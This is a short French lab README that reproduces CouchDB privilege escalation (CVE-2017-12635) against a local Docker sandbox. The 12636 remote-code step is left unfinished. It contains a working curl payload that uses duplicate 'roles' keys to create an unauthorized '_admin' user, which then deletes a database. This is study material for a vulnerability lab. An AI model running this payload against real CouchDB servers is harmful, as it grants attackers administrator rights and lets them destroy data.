# Etude_Faille_CVE_12635 & 12636
Travail r
## Etape 0 : Mise en place de l'environnement de travail
### A partir d'une Docker File 

### Téléchargement du depot GITHUB sur votre machine virtuelle
   https://github.com/Guillaumeclavel/Etude_Faille_CVE_12636  

==> Dépot Public : pas de droit accès à gérer 

## Extraction et positionnement dans le répertoire de travail 

 
## ETAPE 1 : Création du docker contenenat le serveur "couchdb"
### Lancement du docker-compose ou 
`docker container run -d --name couchdb-sandbox -p 5984:5984 couchdb:1.6.1`

### Vérification de la création du serveur:
`curl -X GET http://localhost:5984`

## ETAPE 2 : Mise en en évidence de la faille 12635
### Vérification des base de données créée:
`curl -X GET http://localhost:5984/_all_dbs`

### Création d'une nouvelle base:
`curl -X PUT http://localhost:5984/records`

### Création du compte admin: 
`curl -X PUT http://localhost:5984/_config/admins/admin -d '"admin"'`  

log : admin, mdp : admin

### Creation d'une base:
`curl -X PUT http://localhost:5984/new_records`  
Pas bon car par le bon compte utilisateur.  

`curl -X PUT http://admin:admin@localhost:5984/new_records`
Fonctionnelle car utilisation du compte admin.

### Création d'un doc nouvel utilisateur admin avec la faille:
`curl -X PUT http://localhost:5984/_users/org.couchdb.user:guest \
    -H "Accept: application/json" \
    -H "Content-Type: application/json" \
    -d '{"name": "guest", "password": "guest", "roles": ["_admin"], "roles": [], "type": "user"}'`  

### Suppression du répertoire créer précédement:
`curl -X DELETE http://localhost:5984/new_records`
Ne fonctionne pas car pas de droit.

`curl -X DELETE http://guest:guest@localhost:5984/new_records`  
Fonctionne car utilisation d'un compte admin créé précédement (Escalade de privilege)
## ETAPE 3 : Exploitation de la faille 12636
suppression (Je n'y arrive pas)
docker images pour voir les dockers
docker stop 4138cbdb4df8 pour stopper le docker concerné
docker container rm 4138cbdb4df8 pour supprimer
